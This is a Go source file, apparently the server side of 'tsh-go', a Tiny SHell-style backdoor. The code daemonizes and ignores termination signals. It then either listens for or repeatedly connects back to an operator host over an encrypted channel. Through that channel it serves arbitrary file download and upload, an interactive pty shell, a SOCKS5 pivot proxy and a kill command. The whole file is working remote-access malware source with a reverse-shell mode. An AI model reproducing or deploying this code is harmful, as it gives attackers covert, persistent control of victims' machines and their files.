package server

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"tsh-go/internal/constants"
	"tsh-go/internal/pel"
	"tsh-go/internal/pty"
	"tsh-go/internal/utils"

	"github.com/txthinking/socks5"
)

func RunInBackground() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	cmd := exec.Command(exe, os.Args[1:]...)
	cmd.Env = append(os.Environ(), "TSH_RUNNING_AS_DAEMON=1")
	cmd.Start()
	return nil
}

func Run(secret []byte, host string, port int, delay int, runAsDaemon bool) {
	var isDaemon bool
	if os.Getenv("TSH_RUNNING_AS_DAEMON") == "1" {
		isDaemon = true
	}
	if runAsDaemon && !isDaemon {
		if RunInBackground() != nil {
			fmt.Fprintln(os.Stderr, "Failed to run as daemon")
			os.Exit(1)
		}
		os.Exit(0)
	}

	if runAsDaemon {
		// don't let system kill our child process after closing cmd.exe
		sigchan := make(chan os.Signal, 1)
		signal.Notify(sigchan,
			syscall.SIGINT,
			syscall.SIGTERM,
			syscall.SIGQUIT)
	}

	if host == "" {
		addr := fmt.Sprintf(":%d", port)
		ln, err := pel.Listen(addr, secret, false)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		for {
			layer, err := ln.Accept()
			if err == nil {
				go handleGeneric(layer)
			}
		}
	} else {
		// connect back mode
		addr := fmt.Sprintf("%s:%d", host, port)
		for {
			layer, err := pel.Dial(addr, secret, true)
			if err == nil {
				go handleGeneric(layer)
			}
			time.Sleep(time.Duration(delay) * time.Second)
		}
	}
}

// entry handler,
// automatically close connection after handling
// it's safe to run with goroutine
func handleGeneric(layer *pel.PktEncLayer) {
	defer layer.Close()
	defer func() {
		recover()
	}()
	buffer := make([]byte, 1)
	n, err := layer.Read(buffer)
	if err != nil || n != 1 {
		return
	}
	switch buffer[0] {
	case constants.Kill:
		os.Exit(0)
	case constants.GetFile:
		handleGetFile(layer)
	case constants.PutFile:
		handlePutFile(layer)
	case constants.RunShell:
		handleRunShell(layer)
	case constants.SOCKS5:
		handleSocks5(layer)
	}
}

func handleGetFile(layer *pel.PktEncLayer) {
	buffer := make([]byte, constants.Bufsize)
	n, err := layer.Read(buffer)
	if err != nil {
		return
	}
	filename := string(buffer[:n])
	f, err := os.Open(filename)
	if err != nil {
		return
	}
	defer f.Close()
	utils.CopyBuffer(layer, f, buffer)
}

func handlePutFile(layer *pel.PktEncLayer) {
	buffer := make([]byte, constants.Bufsize)
	var n int
	var err error
	n, err = layer.Read(buffer)
	if err != nil {
		return
	}
	destination := filepath.FromSlash(string(buffer[:n]))
	n, err = layer.Read(buffer)
	if err != nil {
		return
	}
	basename := string(buffer[:n])
	if runtime.GOOS == "windows" {
		basename = strings.ReplaceAll(basename, ":", "_")
		basename = strings.ReplaceAll(basename, "\\", "_")
	}

	// if dst is a directory, save file to dst/basename
	// otherwise, save file to dst
	if fi, err := os.Stat(destination); err == nil && fi.IsDir() {
		destination = filepath.Join(destination, basename)
	}

	f, err := os.OpenFile(destination, os.O_CREATE|os.O_RDWR, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	utils.CopyBuffer(f, layer, buffer)
	layer.Close()
}

func handleRunShell(layer *pel.PktEncLayer) {
	buffer := make([]byte, constants.Bufsize)
	buffer2 := make([]byte, constants.Bufsize)

	n, err := layer.Read(buffer)
	if err != nil {
		return
	}
	term := string(buffer[:n])

	n, err = layer.Read(buffer[:4])
	if err != nil || n != 4 {
		return
	}
	ws_row := int(buffer[0])<<8 + int(buffer[1])
	ws_col := int(buffer[2])<<8 + int(buffer[3])

	n, err = layer.Read(buffer)
	if err != nil {
		return
	}
	command := string(buffer[:n])

	tp, err := pty.OpenPty(command, term, uint32(ws_col), uint32(ws_row))
	if err != nil {
		return
	}
	defer tp.Close()
	go func() {
		utils.CopyBuffer(tp.StdIn(), layer, buffer)
		tp.Close()
	}()
	utils.CopyBuffer(layer, tp.StdOut(), buffer2)
}

func handleSocks5(layer *pel.PktEncLayer) {
	srv, _ := socks5.NewClassicServer("127.0.0.1:9050", "127.0.0.1", "", "", 0, 60)
	srv.SupportedCommands = []byte{socks5.CmdConnect} // TODO: CmdUDP
	if err := srv.Negotiate(layer); err != nil {
		log.Println(err)
		return
	}
	req, err := srv.GetRequest(layer)
	if err != nil {
		log.Println(err)
		return
	}
	fmt.Println("Request type", req.Cmd)
	if req.Cmd == socks5.CmdConnect {
		conn, err := req.Connect(layer)
		if err != nil {
			layer.Close()
			log.Println(err)
			return
		}
		fmt.Println("Connection established", conn.RemoteAddr())
		wg := &sync.WaitGroup{}
		wg.Add(2)
		go func() {
			utils.StreamPipe(layer, conn, make([]byte, constants.MaxMessagesize))
			wg.Done()
		}()
		go func() {
			utils.StreamPipe(conn, layer, make([]byte, constants.MaxMessagesize))
			wg.Done()
		}()
		wg.Wait()
		layer.Close()
		conn.Close()
		fmt.Println("Connection closed", conn.RemoteAddr())
		return
	}
}
